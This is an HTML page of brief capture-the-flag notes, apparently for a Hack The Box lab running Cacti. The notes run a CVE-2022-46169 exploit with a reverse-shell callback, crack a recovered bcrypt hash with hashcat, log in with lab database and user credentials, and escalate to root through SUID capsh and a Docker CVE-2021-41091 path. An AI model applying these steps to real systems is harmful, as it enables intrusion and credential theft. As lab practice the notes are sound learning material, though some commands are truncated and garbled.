@@ -1,0 +1,33 @@
+<html>
+  
+  <head>
+    <meta charset="utf-8">
+  </head>
+  
+  <body>
+    <p>we find a exploit on github that we can use to get user.</p>
+    <p>python3 CVE-2022-46169.py -u http://10.10.11.211 --LHOST=10.10.14.11 --LPORT=9999</p>
+    <p>md5 hashes found</p>
+    <p>admin','21232f297a57a5a743894a0e4a801fc3</p>
+    <p>guest','43e9a4ab75570f5b'</p>
+    <p>these are pointless</p>
+    <p>we find a file called entrypoint.sh which has sql creds however none work</p>
+    <p>mysql --host=db --user=root --password=root cacti</p>
+    <p>suid capsh is available so we can use this to become root</p>
+    <p>cd /sbin</p>
+    <p>./capsh --gid=0 --uid=0 --</p>
+    <p>however we still have no flags</p>
+    <p>Looks like mysql does work(just not for me)</p>
+    <p>mysql --host=db --user=root --password=root cacti -e "show table</p>
+    <p>we can get the hash for marcus $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C</p>
+    <p>hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt</p>
+    <p>marcus:funkymonkey</p>
+    <p>on marcus we can find the docker version with</p>
+    <p>docker -</p>
+    <p>dockerversion 20..10.5 which has an exploit CVE-2021-41091</p>
+    <p>once we use the exploit you can cd var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bash</p>
+    <p>execute ./bash -p</p>
+    <p>we are root</p>
+  </body>
+
+</html>
